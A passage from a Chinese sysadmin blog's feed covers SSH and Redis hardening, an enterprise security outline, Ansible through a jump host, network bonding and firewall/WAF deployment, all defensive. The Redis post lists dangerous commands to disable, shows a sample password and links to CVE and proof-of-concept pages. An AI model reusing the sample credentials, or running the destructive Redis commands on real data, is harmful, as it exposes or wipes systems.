HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

#Privilege Separation is turned on for security
UsePrivilegeSeparation yes

# Lifetime and size of ephemeral version 1 server key
KeyRegenerationInterval 3600
ServerKeyBits 1024

# Logging
SyslogFacility AUTH
LogLevel INFO

# Authentication:
LoginGraceTime 120
PermitRootLogin no
StrictModes yes
PasswordAuthentication no
ChallengeResponseAuthentication no
RSAAuthentication yes
PubkeyAuthentication yes
MaxAuthTries 4
PermitEmptyPasswords no
PermitUserEnvironment no
Ciphers aes128-ctr,aes192-ctr,aes256-ctr

# Don&#39;t read the user&#39;s ~/.rhosts and ~/.shosts files
IgnoreRhosts yes

# For this to work you will also need host keys in /etc/ssh_known_hosts
RhostsRSAAuthentication no

# similar for protocol version 2
HostbasedAuthentication no

# Disable X11 Forward
X11Forwarding no

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# File Transfer
Subsystem sftp /usr/lib/openssh/sftp-server

# Idle Log Out Timeout Interval 
ClientAliveInterval 600
ClientAliveCountMax 0

# Banner
Banner /etc/issue

# use PAM
UsePAM yes
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;# chown root:root /etc/ssh/sshd_config
# chmod 600 /etc/ssh/sshd_config

# chmod 644 /etc/motd
# chmod 644 /etc/issue
# chmod 644 /etc/issue.net
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;参考：
https://www.cyberciti.biz/tips/linux-unix-bsd-openssh-server-best-practices.html
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;10-iptables-配置&#34;&gt;10.iptables 配置&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;详见配置文件：
Cyqz_OS_Security_Checklist_iptables.md

保存iptables规则
apt-get install iptables-persistent
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;11-高级主题&#34;&gt;11.高级主题&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;11.1）Kernel Grsecurity/PaX补丁，MAC（SELinux/AppArmor）
11.2) Kernel Livepatch（OS内核安全Patch，无需重启）
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;12-待完善&#34;&gt;12.待完善&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;PAM/sudo/mount
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;13-参考资料&#34;&gt;13.参考资料&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;https://wiki.ubuntu.com/Security/Features
https://wiki.ubuntu.com/Security/Features/Historical
https://help.ubuntu.com/14.04/serverguide/security.html
https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/Security_Guide/index.html
https://benchmarks.cisecurity.org/tools2/linux/CIS_Ubuntu_14.04_LTS_Server_Benchmark_v1.0.0.pdf
https://github.com/GovReady/ubuntu-lts/blob/master/hardening.md
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;14-本文提到的所有配置文件下载地址&#34;&gt;14.本文提到的所有配置文件下载地址：&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;https://github.com/Zer0d0y/advanced-enterprise-security
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>互联网企业安全指南（一）：基础架构安全</title>
      <link>https://www.zer0d0y.info/post/advanced-enterprise-security-guidelines-for-internet-companies/</link>
      <pubDate>Fri, 21 Apr 2017 10:54:28 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/advanced-enterprise-security-guidelines-for-internet-companies/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/AES-sec.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - 互联网企业安全漫谈，本系列将持续更新
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;1-外部攻击&#34;&gt;1.外部攻击&lt;/h5&gt;

&lt;p&gt;攻击方式及应对策略&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.) DDOS流量型（Syn、UDP等）
a.）攻击域名（case.zer0d0y.com） ---&amp;gt; CDN服务提供商
# 应对策略：
①.依赖CDN服务提供商
②.第三方服务或运营商核心节点数据中心

b.）攻击IP ---&amp;gt; LVS或后端服务器IP
# 应对策略：
①.公开指定IP（防火墙、WAF设备）
②.第三方服务或运营商核心节点数据中心
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;2.) Web HTTP相关Flood
a.）攻击域名（后端域名：cyqzmain.zer0d0y.com，case.zer0d0y.com 有CDN服务可以不考虑）
# 应对策略：
①.WAF
②.LVS + Nginx + lua
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;3.）DNS，查询Flood
a.）Query Flood（故障现象：域名无法解析，网站打不开）
# 应对策略：
①.第三方服务（高防DNS）
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-网络层-边界-安全&#34;&gt;2.网络层（边界）安全&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.) 访问控制
a.）管理接口：只允许固定IP and/or 堡垒（跳板）机访问
b.）接口及端口：服务器监听内网接口
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;3-网络层-内部lan-安全&#34;&gt;3.网络层（内部Lan）安全&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.) 设备安全
a.）ARP攻击、L2攻击（如，VTP Hopping）
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;2.）数据传输安全
a.）避免明文传送（数据走内网也需要加密！！！）
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;4-系统层-os-安全&#34;&gt;4.系统层（OS）安全&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.) 访问控制: 认证
a.）跳板机/Red Hat IDM
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;2.）加固（Hardening）
a.）Kernel Grsecurity/PaX补丁，MAC（SELinux/AppArmor）
b.) Kernel Livepatch（OS内核安全Patch，无需重启）
c.) 自动更新安全补丁
d.) 组件最小化，只安装必要组件
e.) 文件系统完整性监控（Audit、Monit）
f.) 权限控制（禁用远程root登录、sudo）
g.) 密码策略（密码强度、定期更新）
h.) 主机层面访问控制（Iptables 限制（性能及安全问题（raw sockets、tracking helpers）），SSH可选安全（port knock，two factor authentication））
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;5-应用服务层-nginx-tomcat等&#34;&gt;5.应用服务层（Nginx/Tomcat等）&lt;/h5&gt;

&lt;p&gt;基本原则：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;①.最新版（发行版自带、自编译）
②.Patch
③.监听Loopbook或内网接口
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;6-访问层-业务逻辑-数据库-web-接口等&#34;&gt;6.访问层（业务逻辑）（数据库、Web、接口等）&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.) 数据加密
a.) 传输加密，如HTTPS
b.) 数据加密，如密码加密
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;2.) 攻击方式
a.) CC攻击（Http Get/Post等）
# 应对策略：
Waf/Nginx/程序请求比率限制

b.) 注入攻击（Mysql、Redis、Web）
# 应对策略：
Mysql/Redis基本安全设置，CSP（内容安全策略）
Todo（需要先进行渗透传输和代码设计）
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;7-物理安全&#34;&gt;7.物理安全&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.）BIOS加密
2.）磁盘加密
3.）启动管理器（Grub）加密
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;8-操作安全&#34;&gt;8.操作安全&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.）操作规范（非常重要）
2.）运维工作站安全
3.）密码管理器
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;9-安全监控-应急响应-数字取证&#34;&gt;9.安全监控&amp;amp;应急响应&amp;amp;数字取证&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.) 安全监控：网络
a.) 部署Bro NSM（入侵检测、流量分析等等），在核心交换机使用端口镜像把流量复制到Bro
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;2.) 安全监控：主机
a.) 把相关日志推送到ELK Stack
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;3.) 应急响应&amp;amp;数字取证
a.) 网络取证
工具：Bro NSM

b.) 磁盘取证

c.) 内存取证
工具：LiME、Volatility 
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;10-渗透测试&#34;&gt;10.渗透测试&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;11-0day和apt攻击&#34;&gt;11.0day和APT攻击&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;12-不同维度&#34;&gt;12.不同维度&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;13-参考资料&#34;&gt;13.参考资料&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.https://www.zer0d0y.info/post/DevSecOps/
2.http://www.ayazero.com/
3.https://cloud.google.com/security/
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Redis 安全规范</title>
      <link>https://www.zer0d0y.info/post/Securing_Redis/</link>
      <pubDate>Thu, 20 Apr 2017 16:56:10 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Securing_Redis/</guid>
      <description>
&lt;figure &gt;
    
        &lt;img src=&#34;images/Securing_redis.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - Redis安全最佳实践
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.信任的内网运行，绑定Redis监听的网络接口。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bind 192.168.1.100 10.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.禁止root用户启动redis&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;useradd -M -s /sbin/nologin [username]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.限制redis文件目录访问权限&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;chmod 700 /var/lib/redis   #假设这是你redis目录
chmod 600 /etc/redis/redis.conf  #假设这是你redis配置文件
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4.避免使用默认端口&lt;/p&gt;

&lt;p&gt;5.开启Redis密码认证，并设置高复杂度密码（需要重启redis才能生效）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vim /etc/redis/redis.conf  
requirepass ed4c39b015b0e46f079775474dbfd0a9a4ab278f63340a6d640999f25c68a932fef815
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6.服务精细化授权&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 禁用或重命名危险命令（FLUSHDB, FLUSHALL, KEYS,PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME,DEBUG, EVAL等）
rename-command CONFIG CONFIG_b9fc8327c4dee7
rename-command SHUTDOWN SHUTDOWN_b9fc8327c4dee7
rename-command FLUSHDB &amp;quot;&amp;quot;
rename-command FLUSHALL &amp;quot;&amp;quot;
# 重启生效
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7.防火墙屏蔽Redis端口&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;iptables -A INPUT -p tcp --dport 6379 -j DROP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;8.禁止在Redis中存储敏感的明文数据&lt;/p&gt;

&lt;p&gt;9.数据加密传输&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spiped
参考：http://www.tarsnap.com/spiped.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;10.安全监控&lt;/p&gt;

&lt;p&gt;11.Redis Cluster（同步）不支持密码问题 - 可忽略&lt;/p&gt;

&lt;p&gt;12.Redis3.2.0的保护模式&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;如果Redis在启动时，未开启bind和密码设置功能，只能通过回环地址本地访问
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;13.定期更新&lt;/p&gt;

&lt;p&gt;14.参考资料：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Redis Security
https://redis.io/topics/security
Redis CVE
https://www.cvedetails.com/vulnerability-list/vendor_id-15183/product_id-31837/year-2016/Pivotal-Software-Redis.html

Vulnerability Spotlight: Redis CONFIG SET client-output-buffer-limit Code Execution Vulnerability
http://blog.talosintelligence.com/2016/09/redis-vulnerability.html
Redis未授权访问漏洞
https://help.aliyun.com/knowledge_detail/37447.html
Redis CSRF 漏洞
https://yq.aliyun.com/articles/69183?spm=5176.8246799.0.0.rjoQtW
Redis CSRF 漏洞 POC
https://github.com/dxa4481/Damn-Vulnerable-Redis-Container
Redis EVAL Lua Sandbox Escape
http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Using ansible with a jump host</title>
      <link>https://www.zer0d0y.info/post/using-ansible-with-a-jump-host/</link>
      <pubDate>Thu, 20 Apr 2017 14:19:21 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/using-ansible-with-a-jump-host/</guid>
      <description>
&lt;figure &gt;
    
        &lt;img src=&#34;images/ansible-red-hat-blog-top.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - 配置Ansible通过jump host/jump server（跳板机）管理服务器
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.Ansible Playbook目录结构&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jumphost_playbook/
├── ansible.cfg
├── inventory
└── ssh.config
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.Ansible配置&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# vi ansible.cfg

[ssh_connection]
ssh_args = -F ssh.config # 指定ssh config（语法同~/.ssh/config）
control_path = ~/.ssh/mux-%%r@%%h:%%p

# 配置文件读取优先级
* ANSIBLE_CONFIG (an environment variable)
* ansible.cfg (in the current directory)
* .ansible.cfg (in the home directory)
* /etc/ansible/ansible.cfg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.Ansible inventory配置&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# vi inventory

### 跳板机01
[jump01]
8.8.8.8.236


### 北京IDC
[bj-cyqz-all:children]
bj-cyqz-lvs
bj-cyqz-web


### 北京IDC-LVS
[bj-cyqz-lvs]
bj-cyqz-lvs[1:2]


### 北京IDC-Web
[bj-cyqz-web]
bj-cyqz-web[1:3]

# 参考：
http://docs.ansible.com/ansible/intro_inventory.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4.ssh config 配置&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 跳板机和Real服务器均使用key登录
# vi ssh.config

# 定义跳板机
Host jump
        User Zer0d0y
        Hostname 8.8.8.236
        port 12345
        IdentityFile /home/zer0d0y/.ssh/Zer0d0y.rsa

# 定义Real服务器
Host bj-cyqz-lvs1
        User ring3
        Hostname 4.4.4.162
        Port 12345
        IdentityFile /home/zer0d0y/.ssh/ring3_id_rsa.rsa
        ProxyCommand ssh -W %h:%p jump

Host bj-cyqz-lvs2
        User ring3
        Hostname 4.4.4.174
        Port 12345
        IdentityFile /home/zer0d0y/.ssh/ring3_id_rsa.rsa
        ProxyCommand ssh -W %h:%p jump

Host bj-cyqz-web1
        User ring3
        Hostname 4.4.4.170
        Port 12345
        IdentityFile /home/zer0d0y/.ssh/ring3_id_rsa.rsa
        ProxyCommand ssh -W %h:%p jump

Host bj-cyqz-web2
        User ring3
        Hostname 4.4.4.171
        Port 12345
        IdentityFile /home/zer0d0y/.ssh/ring3_id_rsa.rsa
        ProxyCommand ssh -W %h:%p jump

Host bj-cyqz-web3
        User ring3
        Hostname 4.4.4.172
        Port 12345
        IdentityFile /home/zer0d0y/.ssh/ring3_id_rsa.rsa
        ProxyCommand ssh -W %h:%p jump

# 注意：以下两行必须加上，否则ansible.cfg配置中的-F参数不能正确处理此文件
Host *
    SendEnv LANG LC_*

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5.验证&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# ssh-add /home/zer0d0y/.ssh/Zer0d0y.rsa
# ssh-add /home/zer0d0y/.ssh/ring3_id_rsa.rsa

# ssh -F ssh.config bj-cyqz-lvs1
# ansible -i inventory bj-cyqz-all -m ping
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6.安全问题&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;推荐使用ProxyCommand，切勿使用SSH Agent Forwarding方式
# 参考：
https://github.com/joushou/sshmuxd#but-agent-forwarding-is-dangerous
https://heipei.github.io/2015/02/26/SSH-Agent-Forwarding-considered-harmful/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7.参考资料：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Ansible
http://docs.ansible.com/ansible/faq.html#how-do-i-configure-a-jump-host-to-access-servers-that-i-have-no-direct-access-to
https://alexbilbie.com/2014/07/using-ansible-with-a-bastion-host/
https://blog.laisky.com/p/ansible/

SSH
https://wiki.gentoo.org/wiki/SSH_jump_host
https://ma.ttias.be/use-jumphost-ssh-client-configurations/
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Ubuntu Server 16.04 LTS Network Bonding</title>
      <link>https://www.zer0d0y.info/post/Ubuntu-Server-16.04-LTS-Network-Bonding/</link>
      <pubDate>Wed, 19 Apr 2017 23:10:58 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Ubuntu-Server-16.04-LTS-Network-Bonding/</guid>
      <description>&lt;pre&gt;&lt;code&gt;TL;DR - Ubuntu 16.04 Bonding （802.3ad or 4，[balance-rr or 0]）配置
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;# 在继续阅读之前，确保已经阅读并理解以下文档：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Linux Ethernet Bonding Driver HOWTO
https://www.kernel.org/doc/Documentation/networking/bonding.txt

Implementing EtherChannel in a Switched Network
http://www.ciscopress.com/articles/article.asp?p=2348266&amp;amp;seqNum=3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;# 网卡bonding通常可以通过两种方式实现，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.）网卡配置文件 + Ifenslave 
2.）通过sysfs接口
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.配置Bonding 802.3ad (mode 4)模式 + Transmit Hash Policy: layer3+4&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ENV（环境）说明：
1.交换机：LB4M（呵呵！！！）
2.OS：Ubuntu Server 16.04 LTS
3.服务器4个网卡与交换机互联
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.）安装ifenslave和内核支持&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# apt-get install ifenslave
# echo bonding &amp;gt;&amp;gt; /etc/modules
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.）配置网卡&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# vi /etc/network/interfaces

source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

# The primary network interface
auto bond0
iface bond0 inet static
address 8.8.8.86
netmask 255.255.255.240
gateway 8.8.8.81
bond-mode 4
bond-miimon 100
bond-xmit_hash_policy layer3+4
bond-lacp-rate 1
bond-slaves eth0 eth1 eth2 eth3
dns-nameservers 114.114.114.114 233.5.5.5

auto bond0:1
iface bond0:1 inet static
address 192.168.2.251
netmask 255.255.255.0


auto eth0
iface eth0 inet manual
bond-master bond0

auto eth1
iface eth1 inet manual
bond-master bond0

auto eth2
iface eth2 inet manual
bond-master bond0

auto eth3
iface eth3 inet manual
bond-master bond0

# systemctl restart networking
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.）配置LB4M交换机（port-channel min-links 4）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;port-channel name 3/30 86
interface 0/30
addport 3/30
exit

interface 0/31
addport 3/30
exit

interface 0/32
addport 3/30
exit

interface 0/33
addport 3/30
exit

interface 3/30
no port-channel static
# port-channel load-balance 6
port-channel min-links 4
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4.）验证&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# ethtool bond0
# ip add list or ifconfig

# cat /proc/net/bonding/bond0

Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011)

Bonding Mode: IEEE 802.3ad Dynamic link aggregation
Transmit Hash Policy: layer3+4 (1)
MII Status: up
MII Polling Interval (ms): 100
Up Delay (ms): 0
Down Delay (ms): 0

802.3ad info
LACP rate: fast
Min links: 0
Aggregator selection policy (ad_select): stable
System priority: 65535
System MAC address: b8:ca:3a:6f:4d:2c
Active Aggregator Info:
	Aggregator ID: 1
	Number of ports: 4
	Actor Key: 9
	Partner Key: 83
	Partner Mac Address: 60:eb:69:a9:26:9d

Slave Interface: eth0
MII Status: up
Speed: 1000 Mbps
Duplex: full
Link Failure Count: 0
Permanent HW addr: b8:ca:3a:6f:4d:2c
Slave queue ID: 0
Aggregator ID: 1
Actor Churn State: none
Partner Churn State: none
Actor Churned Count: 0
Partner Churned Count: 0
details actor lacp pdu:
    system priority: 65535
    system mac address: b8:ca:3a:6f:4d:2c
    port key: 9
    port priority: 255
    port number: 1
    port state: 63
details partner lacp pdu:
    system priority: 32768
    system mac address: 60:eb:69:a9:26:9d
    oper key: 83
    port priority: 128
    port number: 30
    port state: 61

Slave Interface: eth1
MII Status: up
Speed: 1000 Mbps
Duplex: full
Link Failure Count: 0
Permanent HW addr: b8:ca:3a:6f:4d:2d
Slave queue ID: 0
Aggregator ID: 1
Actor Churn State: none
Partner Churn State: none
Actor Churned Count: 0
Partner Churned Count: 0
details actor lacp pdu:
    system priority: 65535
    system mac address: b8:ca:3a:6f:4d:2c
    port key: 9
    port priority: 255
    port number: 2
    port state: 63
details partner lacp pdu:
    system priority: 32768
    system mac address: 60:eb:69:a9:26:9d
    oper key: 83
    port priority: 128
    port number: 31
    port state: 61

Slave Interface: eth2
MII Status: up
Speed: 1000 Mbps
Duplex: full
Link Failure Count: 0
Permanent HW addr: b8:ca:3a:6f:4d:2e
Slave queue ID: 0
Aggregator ID: 1
Actor Churn State: none
Partner Churn State: none
Actor Churned Count: 0
Partner Churned Count: 0
details actor lacp pdu:
    system priority: 65535
    system mac address: b8:ca:3a:6f:4d:2c
    port key: 9
    port priority: 255
    port number: 3
    port state: 63
details partner lacp pdu:
    system priority: 32768
    system mac address: 60:eb:69:a9:26:9d
    oper key: 83
    port priority: 128
    port number: 33
    port state: 61

Slave Interface: eth3
MII Status: up
Speed: 1000 Mbps
Duplex: full
Link Failure Count: 0
Permanent HW addr: b8:ca:3a:6f:4d:2f
Slave queue ID: 0
Aggregator ID: 1
Actor Churn State: none
Partner Churn State: none
Actor Churned Count: 0
Partner Churned Count: 0
details actor lacp pdu:
    system priority: 65535
    system mac address: b8:ca:3a:6f:4d:2c
    port key: 9
    port priority: 255
    port number: 4
    port state: 63
details partner lacp pdu:
    system priority: 32768
    system mac address: 60:eb:69:a9:26:9d
    oper key: 83
    port priority: 128
    port number: 32
    port state: 61

# 服务器上生成一个8GB文件并启动4个python进程，然后在客户端同时下载文件
python -m SimpleHTTPServer 8000
python -m SimpleHTTPServer 8001
python -m SimpleHTTPServer 8002
python -m SimpleHTTPServer 8003
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5.测试结果及说明&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.Incoming（入站）/Outgoing（出站），链路速度3.5GBit/s左右

2.出站流量会通过4个网卡发送出去，而且单个连接一次只会使用1个网卡发送流量，速度为1GBbit/s（xmit_hash_policy layer3+4，对分片和非分片的数据包处理方式不同，具体参考：https://www.kernel.org/doc/Documentation/networking/bonding.txt）

3.入站流量会使用所有网卡（4个）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6.参考资料：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https://www.cyberciti.biz/faq/ubuntu-setup-a-bonding-device-and-enslave-two-real-ethernet-devices/
https://help.nceas.ucsb.edu/ubuntu_network_configuration
https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Networking_Guide/ch-Configure_Network_Bonding.html

可选
https://askubuntu.com/questions/858824/ubuntu-16-04-lts-network-does-not-start-on-boot-bonding
http://blogs.candoerz.com/question/229990/8023ad-bonding-configuration-file-on-an-ubuntu-1604-lts-server.aspx
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>部署绿盟防火墙/WAF</title>
      <link>https://www.zer0d0y.info/post/Deploying_nsfocus_ngfw_and_waf/</link>
      <pubDate>Sat, 25 Mar 2017 14:12:28 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Deploying_nsfocus_ngfw_and_waf/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/nsfocus_ngfw_waf.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - 部署防火墙和WAF吓唬坏人
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;1-硬件设备&#34;&gt;1.硬件设备&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.1）IDC交换机（华为-CE6800），两台堆叠
1.2）我方交换机（H3C-5120），两台堆叠
1.3）4台安全设备（绿盟），两台防火墙、两台WAF
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-网络架构说明&#34;&gt;2.网络架构说明&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;2.1）防火墙-防火墙和WAF-WAF之间高可用部署
2.2）交换机之间使用堆叠
2.3）通过“浮动路由”方式实现主备
2.4）目标：8台设备全部高可用
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;3-idc交换机配置&#34;&gt;3.IDC交换机配置&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;3.1）配置“浮动路由”
ip route-static 223.x.x.x 255.255.255.224 10.10.118.42 preference 1
ip route-static 223.x.x.x 255.255.255.224 10.10.118.46 preference 200
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;4-我方交换机配置&#34;&gt;4.我方交换机配置&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;4.1）

sys
vlan 10
vlan 20
interface Vlan-interface10
 ip address 10.10.118.42 255.255.255.252

interface Vlan-interface20
 ip address 10.10.118.46 255.255.255.252
 
interface Vlan-interface1
 ip address 223.x.x.x 255.255.255.224

ip route-static 0.0.0.0 0.0.0.0 10.10.118.41 preference 1
ip route-static 0.0.0.0 0.0.0.0 10.10.118.45 preference 200

interface GigabitEthernet1/0/50
 port link-type access
 port access vlan 10

interface GigabitEthernet2/0/50
  port link-type access
  port access vlan 20
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;5-防火墙接入方式说明&#34;&gt;5.防火墙接入方式说明&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;5.1）IDC交换机和我方交换机通过3层方式实现高可用
5.2）防火墙和WAF3层串联接入，防火墙/WAF之间通过心跳线实现高可用
&lt;/code&gt;&lt;/pre&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;images/nsfocus_waf.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &#34;NSFOCUS WAF&#34;&lt;/caption&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>Ubuntu Server 14.04 LTS  Network Bonding and Restarting Network through SSH</title>
      <link>https://www.zer0d0y.info/post/Ubuntu-Server-14.04-LTS-Network-Bonding-and-Restarting-Network-through-SSH/</link>
      <pubDate>Thu, 16 Mar 2017 22:46:56 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Ubuntu-Server-14.04-LTS-Network-Bonding-and-Restarting-Network-through-SSH/</guid>
      <description>

&lt;pre&gt;&lt;code&gt;TL;DR - Ubuntu Server 14.04 LTS  networking issue In One Place
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;no1-ubuntu-server-14-04-lts-network-bonding-and-restarting-network-through-ssh&#34;&gt;&lt;strong&gt;NO1：Ubuntu Server 14.04 LTS  Network Bonding and Restarting Network through SSH&lt;/strong&gt;&lt;/h5&gt;

&lt;p&gt;1.配置Network Bonding&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ENV（环境）：
OS：Ubuntu Server 14.04 LTS
ifenslave：2.4ubuntu1.2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.）安装ifenslave（Attach and detach slave network devices to a bonding device）&lt;/p&gt;

